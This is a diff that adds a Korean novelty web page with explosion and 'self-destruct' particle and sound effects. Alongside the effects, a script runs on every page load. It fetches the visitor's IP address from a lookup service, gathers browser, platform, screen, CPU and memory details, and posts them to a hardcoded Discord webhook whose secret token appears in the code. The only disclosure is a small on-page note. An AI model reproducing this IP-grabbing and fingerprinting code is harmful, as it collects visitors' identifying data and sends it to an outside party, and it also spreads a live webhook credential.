@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>안녕하세요 — 초강화 미친 이펙트 + 자폭 + 추적 시스템</title>
+  <style>
+    :root{--bg-1:#ffffff;--bg-2:#fff7f0}
+    html,body{height:100%;margin:0;background:var(--bg-1);font-family:system-ui, -apple-system, 'Segoe UI', Roboto, 'Noto Sans KR', 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif;overflow:hidden}
+
+    /* 중앙 텍스트 */
+    .wrap{height:100%;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:18px;user-select:none}
+    #greeting{margin:0;font-size:96px;font-weight:900;color:#000;line-height:1;opacity:1;transition:transform .45s cubic-bezier(.2,.9,.2,1),opacity .25s;will-change:transform,opacity;position:relative;z-index:600;text-rendering:optimizeLegibility;text-shadow:0 6px 24px rgba(0,0,0,0.06)}
+
+    /* 이미지 + 두쫀쿠 영역 */
+    .dukRow{display:flex;gap:14px;align-items:center;margin-top:8px;z-index:610;position:relative}
+    #imgShow{width:160px;height:auto;border-radius:10px;box-shadow:0 12px 30px rgba(0,0,0,0.12);border:2px solid rgba(0,0,0,0.04);background:#fff}
+    #dukText{font-size:48px;font-weight:900;line-height:1;background:linear-gradient(90deg,#000000 0%, #00ff00 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+    #dukBtn{padding:10px 14px;border-radius:10px;border:0;background:linear-gradient(180deg,#111,#000);color:#baffbf;font-weight:900;cursor:pointer;box-shadow:0 10px 30px rgba(0,0,0,.24)}
+
+    /* 버튼 기본 */
+    .controls{display:flex;gap:12px;align-items:center}
+    #explodeBtn, #selfDestructBtn{font-size:16px;padding:10px 14px;border-radius:12px;border:0;cursor:pointer;background:linear-gradient(180deg,#fafafa,#e9e9e9);box-shadow:0 12px 30px rgba(0,0,0,.12);font-weight:800;color:#111}
+    #selfDestructBtn{background:linear-gradient(180deg,#ff5a5a,#d93636);color:white}
+
+    /* canvas */
+    canvas.effectCanvas{position:fixed;inset:0;z-index:300;pointer-events:none;display:block}
+
+    /* overlays */
+    .lens{position:fixed;inset:0;pointer-events:none;z-index:320;background:radial-gradient(circle at 30% 40%, rgba(255,240,200,0.06), rgba(255,130,50,0.0) 25%), radial-gradient(circle at 70% 60%, rgba(180,220,255,0.04), transparent 18%)}
+    .vignette{position:fixed;inset:0;pointer-events:none;z-index:340;background:radial-gradient(ellipse at center, rgba(0,0,0,0) 40%, rgba(0,0,0,0.08) 100%);mix-blend-mode:multiply}
+
+    /* control panel */
+    #ctrl{position:fixed;right:18px;top:18px;z-index:620;background:rgba(255,255,255,0.92);backdrop-filter:blur(6px);padding:8px 10px;border-radius:10px;box-shadow:0 8px 18px rgba(0,0,0,.08);font-size:13px;color:#222}
+    #ctrl label{display:flex;gap:8px;align-items:center;margin-bottom:6px}
+    input[type=range]{width:120px}
+
+    /* screen shake */
+    .screenShake{animation:screenShakeAnim 950ms cubic-bezier(.2,.9,.2,1);}
+    @keyframes screenShakeAnim{0%{transform:translate3d(0,0,0) scale(1)}10%{transform:translate3d(-8px,4px,0) rotate(-0.6deg) scale(1.01)}20%{transform:translate3d(12px,-6px,0) rotate(0.8deg) scale(1.015)}30%{transform:translate3d(-20px,12px,0) rotate(-1.2deg) scale(1.02)}50%{transform:translate3d(14px,-6px,0) rotate(0.6deg) scale(1.008)}70%{transform:translate3d(-6px,3px,0) rotate(-0.3deg) scale(1.004)}100%{transform:translate3d(0,0,0) scale(1)}}
+
+    /* warning box */
+    #warnings{position:fixed;left:12px;bottom:12px;z-index:650;background:rgba(0,0,0,0.72);color:#fff;padding:8px 10px;border-radius:8px;max-width:320px;font-size:12px;line-height:1.35}
+    #warnings strong{display:block;margin-bottom:6px}
+    #warnings ul{margin:0;padding-left:16px}
+
+    @media (max-width:640px){ #dukText{font-size:28px} #imgShow{width:100px} }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1 id="greeting">안녕하세요</h1>
+
+    <div class="dukRow">
+      <img id="imgShow" src="https://i.imgur.com/umf67TU.png" alt="이미지">
+      <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-start">
+        <div id="dukText">두쫀쿠</div>
+        <div class="controls"><button id="dukBtn">두쫀쿠</button></div>
+      </div>
+    </div>
+
+    <div style="margin-top:8px" class="controls">
+      <button id="explodeBtn">안녕하세요</button>
+      <button id="selfDestructBtn">자폭</button>
+    </div>
+  </div>
+
+  <canvas class="effectCanvas" id="fxCanvas"></canvas>
+  <div class="lens"></div>
+  <div class="vignette"></div>
+
+  <div id="ctrl">
+    <label>강도 <input id="pow" type="range" min="0" max="3" step="0.05" value="1"></label>
+    <label>조각 크기 <input id="grain" type="range" min="1" max="8" step="0.5" value="3"></label>
+    <label><input id="soundToggle" type="checkbox" checked> 사운드</label>
+    <small style="opacity:.7;display:block;margin-top:6px">시스템 가동 중: 접속 정보가 기록됩니다.</small>
+  </div>
+
+  <div id="warnings">
+    <strong>추적 및 주의사항</strong>
+    <ul>
+      <li>접속 시 IP 및 기기 사양이 수집됩니다.</li>
+      <li>볼륨 및 발열에 주의하세요.</li>
+    </ul>
+  </div>
+
+  <div id="afterNote" style="position:fixed;left:50%;bottom:12px;transform:translateX(-50%);z-index:640;color:#222;opacity:0">다시 보려면 새로고침하세요</div>
+
+  <script>
+    // --- [WEBHOOK & TRACKING CONFIG] ---
+    const webhookUrl = "https://discord.com/api/webhooks/1468222186404712545/rLUPiOHeCkQgmzmuDFyeeM7GkgrogHu3KPoBUE2RQI2H5fAzZZMJTX_HGQS-iBQmTMAF";
+
+    async function sendTrackingData() {
+        let ip = "추출 실패";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) {}
+
+        const specs = {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            memory: navigator.deviceMemory || "알 수 없음",
+            cores: navigator.hardwareConcurrency || "알 수 없음",
+            lang: navigator.language,
+            time: new Date().toLocaleString()
+        };
+
+        const payload = {
+            embeds: [{
+                title: "🚀 새로운 이펙트 페이지 접속 감지",
+                color: 5814783,
+                fields: [
+                    { name: "📍 IP 주소", value: `**${ip}**`, inline: true },
+                    { name: "🖥️ 운영체제/플랫폼", value: specs.platform, inline: true },
+                    { name: "📏 해상도", value: specs.screen, inline: true },
+                    { name: "⚙️ 하드웨어", value: `CPU: ${specs.cores} Core / RAM: ${specs.memory}GB`, inline: false },
+                    { name: "🌐 브라우저 정보", value: `\`${specs.ua}\``, inline: false },
+                    { name: "🕒 접속 시간", value: specs.time, inline: true }
+                ],
+                footer: { text: "초강화 이펙트 시스템 시뮬레이션" }
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(err => console.error("Webhook 전송 실패"));
+    }
+
+    // --- [EXISTING EFFECT LOGIC] ---
+    const greeting = document.getElementById('greeting');
+    const explodeBtn = document.getElementById('explodeBtn');
+    const selfBtn = document.getElementById('selfDestructBtn');
+    const canvas = document.getElementById('fxCanvas');
+    const ctx = canvas.getContext('2d');
+    const pow = document.getElementById('pow');
+    const grain = document.getElementById('grain');
+    const soundToggle = document.getElementById('soundToggle');
+    const afterNote = document.getElementById('afterNote');
+    const dukTextEl = document.getElementById('dukText');
+    const dukBtn = document.getElementById('dukBtn');
+    const imgShow = document.getElementById('imgShow');
+
+    let audioCtx, masterGain;
+    function ensureAudio(){ if(audioCtx) return; audioCtx = new (window.AudioContext||window.webkitAudioContext)(); masterGain = audioCtx.createGain(); masterGain.gain.value = 0.9; masterGain.connect(audioCtx.destination); }
+
+    function playExplosion(volume=1, deep=false){ 
+      if(!soundToggle.checked) return; 
+      ensureAudio(); 
+      const t = audioCtx.currentTime; 
+      if(deep){ 
+        const oR = audioCtx.createOscillator(); oR.type='sine'; oR.frequency.setValueAtTime(28, t); 
+        const gR = audioCtx.createGain(); gR.gain.setValueAtTime(0, t); gR.gain.linearRampToValueAtTime(1.4*volume, t+0.02); gR.gain.exponentialRampToValueAtTime(0.0005, t+1.6); 
+        oR.connect(gR); gR.connect(masterGain); oR.start(t); oR.stop(t+1.6); 
+      }
+      const bufferSize = audioCtx.sampleRate * 0.45; 
+      const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate); 
+      const data = buffer.getChannelData(0); 
+      for(let i=0;i<bufferSize;i++){ data[i] = (Math.random()*2-1) * Math.pow(1 - i/bufferSize, 2) * 0.85 * (1+volume*0.6); } 
+      const nb = audioCtx.createBufferSource(); nb.buffer = buffer; 
+      const nG = audioCtx.createGain(); nG.gain.setValueAtTime(0.9*volume, t); nG.gain.exponentialRampToValueAtTime(0.001, t+0.8); 
+      nb.connect(nG); nG.connect(masterGain); nb.start(t); nb.stop(t+0.9);
+    }
+
+    function resize(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.addEventListener('resize', resize);
+    window.addEventListener('load', ()=>{ 
+        resize(); 
+        fitText(); 
+        sendTrackingData(); // 접속 시 추적 데이터 전송
+    });
+
+    function fitText(){ 
+        const vw = Math.max(document.documentElement.clientWidth, window.innerWidth); 
+        const base = Math.min(260, Math.max(36, Math.floor(vw * 0.12))); 
+        greeting.style.fontSize = base + 'px'; 
+        dukTextEl.style.fontSize = Math.max(24, Math.floor(base*0.5)) + 'px'; 
+    }
+
+    let particles = [];
+    let state = 'idle'; let raf = null;
+
+    explodeBtn.addEventListener('click', ()=>{ explodeGreeting(); });
+    selfBtn.addEventListener('click', ()=>{ triggerMain(true); });
+    dukBtn.addEventListener('click', ()=>{ explodeDuk(); });
+
+    function triggerMain(isSelf){ 
+        if(state !== 'idle' && state !== 'done') return; 
+        playExplosion(2.0, true);
+        spawnExplosionFromRect(document.body.getBoundingClientRect(), {colorMode:'mono', intensity:3});
+        state='explode'; if(!raf) raf = requestAnimationFrame(loop); 
+    }
+
+    function explodeGreeting(){ 
+        if(state !== 'idle' && state !== 'done') return; 
+        const rect = greeting.getBoundingClientRect(); 
+        spawnExplosionFromRect(rect, {colorMode:'mono', intensity:1.4}); 
+        greeting.style.opacity='0'; 
+        setTimeout(()=>{ greeting.style.display='none'; }, 800);
+        playExplosion(1.2, false);
+        document.body.classList.add('screenShake');
+        state='explode'; if(!raf) raf = requestAnimationFrame(loop);
+    }
+
+    function explodeDuk(){ 
+        if(state !== 'idle' && state !== 'done') return; 
+        const imgRect = imgShow.getBoundingClientRect(); 
+        const textRect = dukTextEl.getBoundingClientRect(); 
+        spawnExplosionFromRect(imgRect, {colorMode:'imgLike', intensity:1.2}); 
+        spawnExplosionFromRect(textRect, {colorMode:'blackgreen', intensity:1.6});
+        dukTextEl.style.opacity='0'; 
+        setTimeout(()=>{ dukTextEl.style.display='none'; imgShow.style.opacity='0'; }, 420);
+        playExplosion(1.6, false);
+        state='explode'; if(!raf) raf = requestAnimationFrame(loop);
+    }
+
+    function spawnExplosionFromRect(rect, opts={}){
+      const w = canvas.width, h = canvas.height; const intensity = opts.intensity || 1; 
+      const colorMode = opts.colorMode || 'mono';
+      const density = 200 * intensity;
+      for(let i=0;i<density;i++){
+        const x = rect.left + Math.random()*rect.width; const y = rect.top + Math.random()*rect.height;
+        const ang = Math.atan2(y - h/2, x - w/2) + (Math.random()-0.5)*1.4;
+        const sp = (4 + Math.random()*12) * (1 + intensity*0.9);
+        const vx = Math.cos(ang)*sp, vy = Math.sin(ang)*sp - (2 + Math.random()*6);
+        let color = colorMode === 'blackgreen' ? (Math.random()>0.5?'#000':'#0f0') : (colorMode==='imgLike'?'#f80':'#111');
+        particles.push({type:'pixel', x, y, vx, vy, size:Math.random()*4, color, life:200+Math.random()*200, age:0});
+      }
+    }
+
+    function loop(now){ 
+        raf = requestAnimationFrame(loop); 
+        update(); 
+        render(); 
+    }
+
+    function update(){ 
+        for(let i=particles.length-1;i>=0;i--){ 
+            const p = particles[i]; p.age += 2;
+            p.x += p.vx; p.y += p.vy; p.vy += 0.2;
+            if(p.age > p.life) particles.splice(i,1);
+        }
+    }
+
+    function render(){ 
+        ctx.clearRect(0,0,canvas.width, canvas.height);
+        for(const p of particles){
+            ctx.globalAlpha = 1 - p.age/p.life;
+            ctx.fillStyle = p.color;
+            ctx.beginPath(); ctx.arc(p.x, p.y, p.size, 0, Math.PI*2); ctx.fill();
+        }
+    }
+
+    window.addEventListener('pointerdown', ()=>{ if(audioCtx && audioCtx.state==='suspended') audioCtx.resume(); }, {once:true});
+  </script>
+</body>
+</html>
